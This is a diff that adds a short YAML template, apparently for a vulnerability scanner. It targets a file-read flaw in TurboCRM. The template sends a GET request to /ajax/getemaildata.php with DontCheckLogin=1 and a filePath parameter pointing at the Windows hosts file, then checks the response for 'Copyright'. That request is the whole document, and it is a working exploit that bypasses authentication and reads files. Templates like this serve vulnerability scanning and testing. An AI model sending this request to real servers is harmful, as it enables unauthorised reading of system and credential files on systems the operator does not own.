@@ -1,0 +1,19 @@
+method: GET
+url: $
+tlsversion: HTTP/1.1
+uri: /ajax/getemaildata.php
+param: DontCheckLogin=1&filePath=c:/windows/system32/drivers/etc/hosts
+data: |
+ 
+others: 
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
+    Accept: text/html,application/xhtml+xml,application/xml;q
+    Accept-Language: zh-CN,zh;q
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+condition: 
+    words: Copyright
+    time: 
+expinformation: 
+    expname: TurboCRM文件读取
+    expdescribe: TurboCRM文件读取,路径为/ajax/getemaildata.php
